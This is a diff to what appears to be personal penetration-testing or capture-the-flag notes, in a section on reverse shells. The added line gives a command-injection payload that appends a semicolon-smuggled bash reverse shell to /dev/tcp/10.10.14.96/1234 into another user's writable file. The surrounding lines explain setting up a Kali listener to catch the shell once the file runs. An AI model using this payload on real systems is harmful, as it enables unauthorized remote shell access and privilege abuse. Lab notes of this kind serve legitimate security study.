@@ -40,7 +40,7 @@ incoming.exe -v
 /etc/apache2/ssl/apache.crtSSLCertificateKeyFile /etc/apache2/ssl/apache.key
 
 # reverse shell in programming languages
-* example: you have access to user "kid" and on the users "yolo" home directory there is a writebale file
+* example: you have access to user "kid" and on the users "yolo" home directory there is a writebale file (input not secured use: `echo “ ;/bin/bash -c ‘bash -i >& /dev/tcp/10.10.14.96/1234 0>&1’ #” >> hackers`
 * You can add a script there with echo "the script" >> nameoffile to overwrite this file. The script points to your kali ip.
 * set up a listener in kali
 * Once the file got executed you will have reverse shell to "yolo"
